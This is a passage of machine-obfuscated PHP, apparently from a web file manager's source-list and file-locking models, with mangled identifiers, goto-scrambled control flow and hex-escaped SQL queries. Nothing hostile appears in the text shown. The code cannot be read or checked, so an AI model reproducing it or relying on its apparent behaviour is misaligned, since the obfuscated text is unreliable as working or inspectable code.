dﬁ÷©∆ùæã; e≤ƒ—≠⁄ù∂: $EäÆﬂÚ´≈Û = $this->tablePrefix . $this->tableName; for ($FÆâπÍÉ…∂ = 0; $FÆâπÍÉ…∂ < $Bò˘®ÖøÔ•; $FÆâπÍÉ…∂++) { $E¿€á⁄ﬁì© = intval($d¿ãøù¬ıÒ[$FÆâπÍÉ…∂][$Dﬁ€«ÈÔ∏›[393]]); if ($d¿ãøù¬ıÒ[$FÆâπÍÉ…∂][$Dﬁ€«ÈÔ∏›[367]]) { $Aé´Ωó‰ı∑ = $d¿ãøù¬ıÒ[$FÆâπÍÉ…∂][$Dﬁ€«ÈÔ∏›[366]]; $fÖã °”ßô .= "\x53\x45\114\105\x43\124\40\52\x20\106\x52\x4f\x4d\x20\50\123\105\x4c\105\103\124\40\47{$Aé´Ωó‰ı∑}\137\150\141\163\106\151\154\145\x27\x20\141\163\x20\150\141\163\x2c\143\x6f\165\156\x74\50\61\51\x20\141\x73\x20\150\x61\163\103\x6f\x75\x6e\x74\40\x46\x52\117\115\x20\x60{$EäÆﬂÚ´≈Û}\140\x20\12\11\x9\x9\11\11\167\150\x65\x72\145\x20\160\x61\x72\x65\156\x74\x49\x44\x3d{$Aé´Ωó‰ı∑}\x20\141\x6e\144\40\x69\163\106\157\x6c\144\x65\x72\x3d\x30\40\141\156\144\40\x69\x73\104\x65\x6c\x65\x74\x65\75{$E¿€á⁄ﬁì©}\x29\x20\141\163\40\x74\142\x31\137{$Aé´Ωó‰ı∑}\x20\x75\x6e\151\x6f\156\x20\141\154\x6c\40\12\x9\x9\11\11\11\123\x45\114\105\103\x54\40\x2a\40\x46\122\x4f\x4d\40\50\123\105\x4c\105\x43\x54\x20\47{$Aé´Ωó‰ı∑}\137\150\x61\x73\106\x6f\x6c\144\145\x72\x27\40\141\163\40\x68\141\x73\106\x69\154\x65\54\x63\x6f\165\x6e\164\50\x31\51\40\141\x73\x20\x68\141\163\103\x6f\165\x6e\164\x20\106\x52\x4f\x4d\40\140{$EäÆﬂÚ´≈Û}\x60\x20\xa\x9\11\11\11\11\167\150\145\x72\145\40\x70\141\162\145\x6e\164\111\x44\x3d{$Aé´Ωó‰ı∑}\40\x61\x6e\x64\40\151\163\x46\x6f\154\x64\145\x72\75\61\40\x61\156\x64\x20\x69\x73\104\x65\x6c\x65\164\145\x3d{$E¿€á⁄ﬁì©}\51\x20\x61\163\40\164\142\62\137{$Aé´Ωó‰ı∑}\40\x75\156\151\x6f\156\x20\x61\x6c\154\40"; } if ((strlen($fÖã °”ßô) >= $dùÊ•íµ≥¢ || $FÆâπÍÉ…∂ == $Bò˘®ÖøÔ• - 1) && $fÖã °”ßô) { $fÖã °”ßô = substr($fÖã °”ßô, 0, -strlen($Dﬁ€«ÈÔ∏›[445])); $f“äﬁ¬”§Â = $this->query($fÖã °”ßô); $aÀΩßñÈ·º = array_merge($aÀΩßñÈ·º, $f“äﬁ¬”§Â); $fÖã °”ßô = $Dﬁ€«ÈÔ∏›[33]; } } $aÀΩßñÈ·º = array_to_keyvalue($aÀΩßñÈ·º, $Dﬁ€«ÈÔ∏›[446]); goto BÊ¬≠åÒ≠¯; BÊ¬≠åÒ≠¯: foreach ($d¿ãøù¬ıÒ as &$cÛ‰œ é±Ê) { if ($cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[367]]) { unset($cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[369]]); $cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[189]] = intval($aÀΩßñÈ·º[$cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[366]] . $Dﬁ€«ÈÔ∏›[447]][$Dﬁ€«ÈÔ∏›[448]]); $cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[188]] = intval($aÀΩßñÈ·º[$cÛ‰œ é±Ê[$Dﬁ€«ÈÔ∏›[366]] . $Dﬁ€«ÈÔ∏›[449]][$Dﬁ€«ÈÔ∏›[448]]); } } goto d”ﬂèê¡‚¶; dﬁ÷©∆ùæã: $dùÊ•íµ≥¢ = 1024 * 50; $d¿ãøù¬ıÒ = is_array($d¿ãøù¬ıÒ) ? $d¿ãøù¬ıÒ : array(); $Bò˘®ÖøÔ• = count($d¿ãøù¬ıÒ); goto e≤ƒ—≠⁄ù∂; d”ﬂèê¡‚¶: } protected function _listAppendAuth(&$b…ıü¿¯÷Ï) { goto AÍ«’Íù∑˘; BÖÜç’äÏ¬: $EàËö¢Öí◊ = Model($CÌ÷ﬂá ›¥[450])->getSourceList($FØ∫¿ØêÕÏ, $c’√¡é¡´Ã); foreach ($b…ıü¿¯÷Ï as $eíöÑ‡ê¶≥ => &$Fá⁄Ø≤ú°¥) { $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]] = $EàËö¢Öí◊[$Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[366]]]; if (!$Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]] && $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[368]] == self::TYPE_GROUP) { $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]] = Action($CÌ÷ﬂá ›¥[451])->pathGroupAuthMake($Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[452]]); if (!$Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]] && !_get($GLOBALS, $CÌ÷ﬂá ›¥[453])) { $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[186]] = !1; $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[185]] = !1; } } if ($Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]]) { $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[186]] = AuthModel::authCheckEdit($Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]][$CÌ÷ﬂá ›¥[374]]); $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[185]] = AuthModel::authCheckView($Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[373]][$CÌ÷ﬂá ›¥[374]]); } $this->groupPathDisplay($Fá⁄Ø≤ú°¥); } goto b«⁄Ûª≥µâ; AÍ«’Íù∑˘: $CÌ÷ﬂá ›¥ =& $_SERVER[—Ω]; if (!defined($CÌ÷ﬂá ›¥[423])) { return; } $FØ∫¿ØêÕÏ = array(); goto eñ”ê¢‘éÁ; eñ”ê¢‘éÁ: foreach ($b…ıü¿¯÷Ï as $Fá⁄Ø≤ú°¥) { if ($Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[368]] == self::TYPE_GROUP) { $FØ∫¿ØêÕÏ[] = $Fá⁄Ø≤ú°¥[$CÌ÷ﬂá ›¥[366]]; } } if (!$FØ∫¿ØêÕÏ) { return; } $c’√¡é¡´Ã = array_to_keyvalue($b…ıü¿¯÷Ï, $CÌ÷ﬂá ›¥[366]); goto BÖÜç’äÏ¬; b«⁄Ûª≥µâ: } public function groupPathDisplay(&$A£«¶èÉüπ) { goto BÁÚ∂‚ØŸ; b«‹úﬁﬂ«ﬁ: $Fñª√èÿ‰· = $this->parentLevelArray($Dæó¶Œƒ¡π[$d·ô¿ªÖÁô[455]]); $C–ÔﬂÈ¡Öô = $d·ô¿ªÖÁô[33]; foreach ($Fñª√èÿ‰· as $DΩ‰‚∂»âå) { $B£¨Ÿ†¨ÚÆ = Model($d·ô¿ªÖÁô[454])->getInfo($DΩ‰‚∂»âå); $C–ÔﬂÈ¡Öô .= $B£¨Ÿ†¨ÚÆ[$d·ô¿ªÖÁô[388]][$d·ô¿ªÖÁô[366]] . $d·ô¿ªÖÁô[47]; } goto b°ÕØÂ«Ù‹; b°ÕØÂ«Ù‹: $A£«¶èÉüπ[$d·ô¿ªÖÁô[456]] = $Dæó¶Œƒ¡π[$d·ô¿ªÖÁô[457]]; $A£«¶èÉüπ[$d·ô¿ªÖÁô[377]] = $Dæó¶Œƒ¡π[$d·ô¿ªÖÁô[455]]; $A£«¶èÉüπ[$d·ô¿ªÖÁô[458]] = $Dæó¶Œƒ¡π[$d·ô¿ªÖÁô[459]]; goto AÆ¬Î◊åÎ ; AÆ¬Î◊åÎ : $A£«¶èÉüπ[$d·ô¿ªÖÁô[460]] = $C–ÔﬂÈ¡Öô . $Dæó¶Œƒ¡π[$d·ô¿ªÖÁô[388]][$d·ô¿ªÖÁô[366]]; goto DêÀèì¨õ; BÁÚ∂‚ØŸ: $d·ô¿ªÖÁô =& $_SERVER[—Ω]; if ($A£«¶èÉüπ[$d·ô¿ªÖÁô[368]] != self::TYPE_GROUP) { return; } $Dæó¶Œƒ¡π = Model($d·ô¿ªÖÁô[454])->getInfo($A£«¶èÉüπ[$d·ô¿ªÖÁô[452]]); goto b«‹úﬁﬂ«ﬁ; DêÀèì¨õ: } protected function _listAppendPath(&$AÇà„™ó∏ä) { goto dˆà”€∏·à; E„œüÑÍ–à: $fÌﬂ—ˆ†ÚÀ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($AÇà„™ó∏ä as &$eÀÁÉ•∂≤’) { goto b™ò∆çÙÕ; b™ò∆çÙÕ: $fÆá‰—Û¶’ = $this->parentLevelArray($eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[455]]); $eÌÜ‹§Ê∑´ = $this->_listAppendPathRoot($eÀÁÉ•∂≤’, $fÆá‰—Û¶’); foreach ($fÆá‰—Û¶’ as $c˜™œÂ›ñˆ) { if (isset($D’§¡ÎÜÈ’[$c˜™œÂ›ñˆ])) { $eÌÜ‹§Ê∑´ .= $D’§¡ÎÜÈ’[$c˜™œÂ›ñˆ] . $AãíÓÏÜ‹è[8]; } } goto A˜†™¿Øè®; f‡Áô»£Ωø: $c´◊†æÈÉË = trim($eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[462]], $AãíÓÏÜ‹è[8]); if ($eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[457]] == $AãíÓÏÜ‹è[464] && $c´◊†æÈÉË) { $eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[28]] = $c´◊†æÈÉË; } $this->_listAppendPathRecycle($eÀÁÉ•∂≤’, $fÆá‰—Û¶’, $fÌﬂ—ˆ†ÚÀ); goto cÕ¯–çôúá; A˜†™¿Øè®: if ($fÆá‰—Û¶’) { $eÌÜ‹§Ê∑´ .= $eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[28]]; } if ($eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[367]]) { $eÌÜ‹§Ê∑´ .= $AãíÓÏÜ‹è[8]; } $eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[462]] = str_replace($AãíÓÏÜ‹è[463], $AãíÓÏÜ‹è[8], $eÌÜ‹§Ê∑´); goto f‡Áô»£Ωø; cÕ¯–çôúá: } goto Aô›áÂÉÓœ; b®Û∞å¨ﬁÿ: $cøü†÷ëà° = array(); foreach ($D’§¡ÎÜÈ’ as $b‚≈€‡•õ¡ => $a±Ò€÷Ÿÿ„) { if (!$a±Ò€÷Ÿÿ„) { $cøü†÷ëà°[] = $b‚≈€‡•õ¡; } } if ($cøü†÷ëà°) { $Aã≤éß·äñ = array($AãíÓÏÜ‹è[380] => array($AãíÓÏÜ‹è[381], $cøü†÷ëà°)); if (count($cøü†÷ëà°) == 1) { $eî∑®¨†¬Ï = $this->sourceInfo($cøü†÷ëà°[0]); $eî∑®¨†¬Ï = is_array($eî∑®¨†¬Ï) ? array($eî∑®¨†¬Ï) : !1; } else { $eî∑®¨†¬Ï = $this->field($AãíÓÏÜ‹è[461])->where($Aã≤éß·äñ)->select(); } $AÂû˘§ÖÀá = array_to_keyvalue($eî∑®¨†¬Ï, $AãíÓÏÜ‹è[366], $AãíÓÏÜ‹è[28]); $D’§¡ÎÜÈ’ = array_merge_index($D’§¡ÎÜÈ’, $AÂû˘§ÖÀá); } goto E„œüÑÍ–à; dˆà”€∏·à: $AãíÓÏÜ‹è =& $_SERVER[—Ω]; $D’§¡ÎÜÈ’ = array(); foreach ($AÇà„™ó∏ä as &$eÀÁÉ•∂≤’) { $D’§¡ÎÜÈ’[$eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[366]]] = $eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[28]]; $fÆá‰—Û¶’ = $this->parentLevelArray($eÀÁÉ•∂≤’[$AãíÓÏÜ‹è[455]]); array_shift($fÆá‰—Û¶’); foreach ($fÆá‰—Û¶’ as $c˜™œÂ›ñˆ) { if (!isset($D’§¡ÎÜÈ’[$c˜™œÂ›ñˆ])) { $D’§¡ÎÜÈ’[$c˜™œÂ›ñˆ] = 0; } } } goto b®Û∞å¨ﬁÿ; Aô›áÂÉÓœ: } private function _listAppendPathRecycle(&$D‰ΩÉ«Ô≈ú, $dÃñ’©»íÉ, $a—†û ≈£ÿ) { goto cƒ∂›ÛÎÛˆ; CÀπÛÿ™ÀÀ: $DêÃÇ∫£¨é = explode($f≤»ﬁù’è[8], trim($D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[462]], $f≤»ﬁù’è[8])); $D√¯Ò≥ØØ” = implode($f≤»ﬁù’è[8], array_slice($DêÃÇ∫£¨é, 2)); $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[462]] = $f≤»ﬁù’è[8] . LNG($f≤»ﬁù’è[465]) . $f≤»ﬁù’è[8] . ltrim($D√¯Ò≥ØØ”, $f≤»ﬁù’è[8]); goto eœ‘ã€ìî÷; cƒ∂›ÛÎÛˆ: $f≤»ﬁù’è =& $_SERVER[—Ω]; if (intval($D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($a—†û ≈£ÿ, $dÃñ’©»íÉ) && $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[366]] != $a—†û ≈£ÿ) { return; } goto CÀπÛÿ™ÀÀ; eœ‘ã€ìî÷: $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[455]] = $f≤»ﬁù’è[466] . implode($f≤»ﬁù’è[47], array_slice($dÃñ’©»íÉ, 1)) . $f≤»ﬁù’è[47]; if ($D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[366]] == $a—†û ≈£ÿ) { $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[455]] = $f≤»ﬁù’è[466]; $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[457]] = $f≤»ﬁù’è[464]; $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[28]] = LNG($f≤»ﬁù’è[465]); } $D‰ΩÉ«Ô≈ú[$f≤»ﬁù’è[467]] = $f≤»ﬁù’è[468]; goto f°€ÊÛ®îã; f°€ÊÛ®îã: } protected function _listAppendPathRoot(&$F∑üÙ˜ñ©Ù, $Dÿ“ Á˘Ñ◊) { $CËÇö∆ï÷ë =& $_SERVER[—Ω]; $C°íÏ‹‹äò = $CËÇö∆ï÷ë[33]; if ($F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[368]] == self::TYPE_USER) { if (defined($CËÇö∆ï÷ë[423]) && $F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[452]] == USER_ID) { $C°íÏ‹‹äò = LNG($CËÇö∆ï÷ë[469]); if (!$Dÿ“ Á˘Ñ◊) { $F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[28]] = $C°íÏ‹‹äò; } } else { $Cíè‰±Á∫¯ = Model($CËÇö∆ï÷ë[470])->getInfoSimple($F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[452]]); $C°íÏ‹‹äò = LNG($CËÇö∆ï÷ë[471]) . $CËÇö∆ï÷ë[154] . $Cíè‰±Á∫¯[$CËÇö∆ï÷ë[28]] . $CËÇö∆ï÷ë[472]; } } else { if ($F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[368]] == self::TYPE_GROUP) { $Cíè‰±Á∫¯ = Model($CËÇö∆ï÷ë[454])->getInfoSimple($F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[452]]); $C°íÏ‹‹äò = $Cíè‰±Á∫¯[$CËÇö∆ï÷ë[28]]; } else { if ($F∑üÙ˜ñ©Ù[$CËÇö∆ï÷ë[368]] == self::TYPE_SYSTEM) { $Cíè‰±Á∫¯ = $this->sourceInfo($Dÿ“ Á˘Ñ◊[0], !0); $C°íÏ‹‹äò = $Cíè‰±Á∫¯[$CËÇö∆ï÷ë[28]]; } } } $C°íÏ‹‹äò = $C°íÏ‹‹äò ? $CËÇö∆ï÷ë[8] . $C°íÏ‹‹äò . $CËÇö∆ï÷ë[8] : $CËÇö∆ï÷ë[8]; return $C°íÏ‹‹äò; } protected function _listAppendUser(&$DπÀÍî—÷Ö) { $bè©î Â“ƒ =& $_SERVER[—Ω]; $Bå”Â¿çùÍ = array_to_keyvalue($DπÀÍî—÷Ö, $bè©î Â“ƒ[33], $bè©î Â“ƒ[375]); $añ«≠¡Ω∫Ü = array_to_keyvalue($DπÀÍî—÷Ö, $bè©î Â“ƒ[33], $bè©î Â“ƒ[376]); $aÂîœ∫ÒäÒ = array_merge($Bå”Â¿çùÍ, $añ«≠¡Ω∫Ü); $eìÖî íÆÖ = Model($bè©î Â“ƒ[473])->userListInfo($aÂîœ∫ÒäÒ); foreach ($DπÀÍî—÷Ö as &$b≥ºöÈ»öê) { $e–Ì›∆ïãΩ = $b≥ºöÈ»öê[$bè©î Â“ƒ[375]]; $b≥ºöÈ»öê[$bè©î Â“ƒ[375]] = $eìÖî íÆÖ[$e–Ì›∆ïãΩ] ? $eìÖî íÆÖ[$e–Ì›∆ïãΩ] : !1; $e–Ì›∆ïãΩ = $b≥ºöÈ»öê[$bè©î Â“ƒ[376]]; $b≥ºöÈ»öê[$bè©î Â“ƒ[376]] = $eìÖî íÆÖ[$e–Ì›∆ïãΩ] ? $eìÖî íÆÖ[$e–Ì›∆ïãΩ] : !1; if (isset($b≥ºöÈ»öê[$bè©î Â“ƒ[413]]) && $b≥ºöÈ»öê[$bè©î Â“ƒ[413]][$bè©î Â“ƒ[474]]) { $c…˘¿ÜËÇ⁄ = $GLOBALS[$bè©î Â“ƒ[6]][$bè©î Â“ƒ[84]][$bè©î Â“ƒ[475]]; if ($b≥ºöÈ»öê[$bè©î Â“ƒ[413]][$bè©î Â“ƒ[476]] <= time() - $c…˘¿ÜËÇ⁄) { $this->metaSet($b≥ºöÈ»öê[$bè©î Â“ƒ[366]], $bè©î Â“ƒ[474], null); $this->metaSet($b≥ºöÈ»öê[$bè©î Â“ƒ[366]], $bè©î Â“ƒ[476], null); unset($b≥ºöÈ»öê[$bè©î Â“ƒ[413]][$bè©î Â“ƒ[474]]); continue; } $Aã®–ªå»ÿ = $b≥ºöÈ»öê[$bè©î Â“ƒ[413]][$bè©î Â“ƒ[474]]; $b≥ºöÈ»öê[$bè©î Â“ƒ[413]][$bè©î Â“ƒ[477]] = Model($bè©î Â“ƒ[473])->getInfoSimpleOuter($Aã®–ªå»ÿ); } } } public function parentLevelArray($f—»ÕœºπŸ) { $e“»√©π“ª =& $_SERVER[—Ω]; $f—»ÕœºπŸ = explode($e“»√©π“ª[47], trim($f—»ÕœºπŸ, $e“»√©π“ª[47])); return array_remove_value($f—»ÕœºπŸ, $e“»√©π“ª[464]); } public function listAll($f‹¡ôËÒä‚) { goto e∂√ÎúªÉ⁄; e∂√ÎúªÉ⁄: $Eºƒ™µêç≤ =& $_SERVER[—Ω]; $AµÑºæÑ≠∏ = $this->sourceInfo($f‹¡ôËÒä‚); $F˜åòâô≤Ú = array($Eºƒ™µêç≤[478] => array($Eºƒ™µêç≤[479], $AµÑºæÑ≠∏[$Eºƒ™µêç≤[455]] . $f‹¡ôËÒä‚ . $Eºƒ™µêç≤[480]), $Eºƒ™µêç≤[481] => 0); goto CÛÿ¥◊ﬂ∆€; d€•⁄ôµñ·: $BÑ˘Ï¿ÖÉ§ = array(); foreach ($C´ŸÎ∂ òã as $CÛ‚ØÑæÆ§ => $FîÑŸñçﬁ‰) { goto E“ì√§€Ñ⁄; bâ√£“¢©¶: if (!$FîÑŸñçﬁ‰[$Eºƒ™µêç≤[367]]) { $bÂäåÉƒÊ¬[$Eºƒ™µêç≤[415]] = $FîÑŸñçﬁ‰[$Eºƒ™µêç≤[415]]; $bÂäåÉƒÊ¬[$Eºƒ™µêç≤[485]] = $FîÑŸñçﬁ‰[$Eºƒ™µêç≤[75]]; } $BÑ˘Ï¿ÖÉ§[] = $bÂäåÉƒÊ¬; goto a®ß·¨µÒª; FÍÓË¥ó¶†: $Eßç¨±øöø = str_replace($Eºƒ™µêç≤[463], $Eºƒ™µêç≤[8], $Eßç¨±øöø); $Eßç¨±øöø = str_replace($Eºƒ™µêç≤[463], $Eºƒ™µêç≤[8], $Eßç¨±øöø); $bÂäåÉƒÊ¬ = array($Eºƒ™µêç≤[384] => str_replace($Eºƒ™µêç≤[463], $Eºƒ™µêç≤[8], $Eßç¨±øöø), $Eºƒ™µêç≤[484] => intval($FîÑŸñçﬁ‰[$Eºƒ™µêç≤[367]]), $Eºƒ™µêç≤[388] => $this->pathInfoFilter($FîÑŸñçﬁ‰, !0)); goto bâ√£“¢©¶; E“ì√§€Ñ⁄: $E–ÂÂåÿë∑ = $this->parentLevelArray($FîÑŸñçﬁ‰[$Eºƒ™µêç≤[455]]); array_shift($E–ÂÂåÿë∑); $Eßç¨±øöø = $AÁ´¢∫æÜÌ; goto D»ëî˘íÖØ; D»ëî˘íÖØ: for ($e—Â•†üÀÒ = 0; $e—Â•†üÀÒ < count($E–ÂÂåÿë∑); $e—Â•†üÀÒ++) { $Eßç¨±øöø .= $C´ŸÎ∂ òã[$E–ÂÂåÿë∑[$e—Â•†üÀÒ]][$Eºƒ™µêç≤[28]] . $Eºƒ™µêç≤[8]; } $Eßç¨±øöø .= $FîÑŸñçﬁ‰[$Eºƒ™µêç≤[28]]; if ($FîÑŸñçﬁ‰[$Eºƒ™µêç≤[367]]) { $Eßç¨±øöø .= $Eºƒ™µêç≤[8]; } goto FÍÓË¥ó¶†; a®ß·¨µÒª: } return $BÑ˘Ï¿ÖÉ§; goto f‘∂ûÍÙ˘ë; CÛÿ¥◊ﬂ∆€: $fﬁ◊ö≤“€È = $Eºƒ™µêç≤[482]; $dıå‚∫Ô¡û = "\x4c\105\x46\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\x65\x20\146\151\154\145\x20\157\156\x20\163\157\165\162\x63\145\x2e\x66\x69\154\x65\x49\x44\x20\x3d\40\x66\x69\x6c\145\56\x66\x69\x6c\145\x49\104"; $C´ŸÎ∂ òã = $this->alias($Eºƒ™µêç≤[483])->field($fﬁ◊ö≤“€È)->where($F˜åòâô≤Ú)->join($dıå‚∫Ô¡û)->select(); goto F∞‡¡”ÓÜ‚; A—î®•€Ê√: $C´ŸÎ∂ òã = array_to_keyvalue($C´ŸÎ∂ òã, $Eºƒ™µêç≤[366]); $AÁ´¢∫æÜÌ = "\x2f{$AµÑºæÑ≠∏[$Eºƒ™µêç≤[28]]}\57"; $AÁ´¢∫æÜÌ = $AÁ´¢∫æÜÌ == $Eºƒ™µêç≤[463] ? $Eºƒ™µêç≤[8] : $AÁ´¢∫æÜÌ; goto d€•⁄ôµñ·; F∞‡¡”ÓÜ‚: $this->_listAppendAuth($C´ŸÎ∂ òã); $this->_listAppendUser($C´ŸÎ∂ òã); $this->_listAppendPath($C´ŸÎ∂ òã); goto A—î®•€Ê√; f‘∂ûÍÙ˘ë: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($F»Õ≈øù∞Ü) { goto DƒËÎÕ¢ˆï; DƒËÎÕ¢ˆï: $Fßáû¢Ô˘Ó =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fßáû¢Ô˘Ó[486], $F»Õ≈øù∞Ü); goto Cê›¿Úá›◊; Cê›¿Úá›◊: $AÑÜÖ„¯™… = 1; $this->_lockEvent($F»Õ≈øù∞Ü, array($Fßáû¢Ô˘Ó[487], $Fßáû¢Ô˘Ó[488]), $AÑÜÖ„¯™…); $this->_lockParent($F»Õ≈øù∞Ü, array($Fßáû¢Ô˘Ó[488]), $AÑÜÖ„¯™…); goto fì‹¯æêàé; fì‹¯æêàé: $this->_lockEvent($F»Õ≈øù∞Ü, array($Fßáû¢Ô˘Ó[489], $Fßáû¢Ô˘Ó[490]), $AÑÜÖ„¯™…); $this->_lockCheckEnd($Fßáû¢Ô˘Ó[486], $F»Õ≈øù∞Ü); goto Aç™ãû‡åà; Aç™ãû‡åà: } public function lockCopyEnd($fÚüÒ∏—Òª) { $d∆–õﬁâ·√ =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $E‚ºÑŸÒè◊ = 0; $this->_lockEvent($fÚüÒ∏—Òª, array($d∆–õﬁâ·√[487], $d∆–õﬁâ·√[488]), $E‚ºÑŸÒè◊); $this->_lockParent($fÚüÒ∏—Òª, array($d∆–õﬁâ·√[488]), $E‚ºÑŸÒè◊); $this->_lockEvent($fÚüÒ∏—Òª, array($d∆–õﬁâ·√[489], $d∆–õﬁâ·√[490]), $E‚ºÑŸÒè◊); } public function lockWriteStart($d˘∆à€µ, $BÍ∏øöÂƒﬂ = '') { goto BÎß’è˘õı; BÚ®˘µ¨¿˘: $this->_lockParent($d˘∆à€µ, array($B˘∫Óåç£ò[486], $B˘∫Óåç£ò[488]), $f£Ω¬Ò∞≥˜); $this->_lockCheckEnd($B˘∫Óåç£ò[487], $d˘∆à€µ); goto Dà¶ÓñøÇä; aãﬁÂ¶ÌÑã: $f£Ω¬Ò∞≥˜ = 1; $this->_lockKey($B˘∫Óåç£ò[491] . $d˘∆à€µ . $B˘∫Óåç£ò[93] . $BÍ∏øöÂƒﬂ, $f£Ω¬Ò∞≥˜); $this->_lockEvent($d˘∆à€µ, array($B˘∫Óåç£ò[486], $B˘∫Óåç£ò[488]), $f£Ω¬Ò∞≥˜); goto BÚ®˘µ¨¿˘; BÎß’è˘õı: $B˘∫Óåç£ò =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $this->_lockCheck($B˘∫Óåç£ò[487], $d˘∆à€µ); goto aãﬁÂ¶ÌÑã; Dà¶ÓñøÇä: } public function lockWriteEnd($f∞ä∑–â‚∞, $Aá◊ö∆Ø•ä = '') { $aˆàﬂâŒ±» =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $f´‡¨óÈÿº = 0; $this->_lockKey($aˆàﬂâŒ±»[491] . $f∞ä∑–â‚∞ . $aˆàﬂâŒ±»[93] . $Aá◊ö∆Ø•ä, $f´‡¨óÈÿº); $this->_lockEvent($f∞ä∑–â‚∞, array($aˆàﬂâŒ±»[486], $aˆàﬂâŒ±»[488]), $f´‡¨óÈÿº); $this->_lockParent($f∞ä∑–â‚∞, array($aˆàﬂâŒ±»[486], $aˆàﬂâŒ±»[488]), $f´‡¨óÈÿº); } public function lockMoveStart($DëÏÓﬂ»∫π) { goto Bπ±·òÖñ„; D≈±µÖ§ä≥: $this->_lockParent($DëÏÓﬂ»∫π, array($AÎÑ‘‚‰ïÌ[486], $AÎÑ‘‚‰ïÌ[488]), $D¯ıﬂ°Õª˘); $this->_lockEvent($DëÏÓﬂ»∫π, array($AÎÑ‘‚‰ïÌ[493], $AÎÑ‘‚‰ïÌ[489], $AÎÑ‘‚‰ïÌ[490]), $D¯ıﬂ°Õª˘); $this->_lockCheckEnd($AÎÑ‘‚‰ïÌ[488], $DëÏÓﬂ»∫π); goto EÍ∑Ö¶úÍ©; Då¬®¥Ûı£: $D¯ıﬂ°Õª˘ = 1; $this->_lockKey($AÎÑ‘‚‰ïÌ[492] . $DëÏÓﬂ»∫π, $D¯ıﬂ°Õª˘); $this->_lockEvent($DëÏÓﬂ»∫π, array($AÎÑ‘‚‰ïÌ[486], $AÎÑ‘‚‰ïÌ[487]), $D¯ıﬂ°Õª˘); goto D≈±µÖ§ä≥; Bπ±·òÖñ„: $AÎÑ‘‚‰ïÌ =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÎÑ‘‚‰ïÌ[488], $DëÏÓﬂ»∫π); goto Då¬®¥Ûı£; EÍ∑Ö¶úÍ©: } public function lockMoveEnd($Dóπö‰∑¡É) { goto aã˘÷ÀÀú∫; AÂÜ ø¢ÔË: $this->_lockEvent($Dóπö‰∑¡É, array($cç‡¨µçãó[493], $cç‡¨µçãó[489], $cç‡¨µçãó[490]), $DÉ‹¢ó∂óÏ); goto dÙü˜±Ø¯ê; bˆ™ê›‚ú: $this->_lockKey($cç‡¨µçãó[492] . $Dóπö‰∑¡É, $DÉ‹¢ó∂óÏ); $this->_lockEvent($Dóπö‰∑¡É, array($cç‡¨µçãó[486], $cç‡¨µçãó[487]), $DÉ‹¢ó∂óÏ); $this->_lockParent($Dóπö‰∑¡É, array($cç‡¨µçãó[486], $cç‡¨µçãó[488]), $DÉ‹¢ó∂óÏ); goto AÂÜ ø¢ÔË; aã˘÷ÀÀú∫: $cç‡¨µçãó =& $_SERVER[—Ω]; if (!$this->allowLock()) { return; } $DÉ‹¢ó∂óÏ = 0; goto bˆ™ê›‚ú; dÙü˜±Ø¯ê: } private function _lockCheck($b òıÉÉ˘©, $bŒ¯ŒõˆÀ¨) { goto cÔ¬‘‹‰‰ﬁ; cÔ¬‘‹‰‰ﬁ: $dú”ƒâê›ï =& $_SERVER[—Ω]; $C≈„ºåúêÇ = $this->sourceInfo($bŒ¯ŒõˆÀ¨); $fáÑéÚÆ¥à = $b òıÉÉ˘© . $dú”ƒâê›ï[93] . $bŒ¯ŒõˆÀ¨; 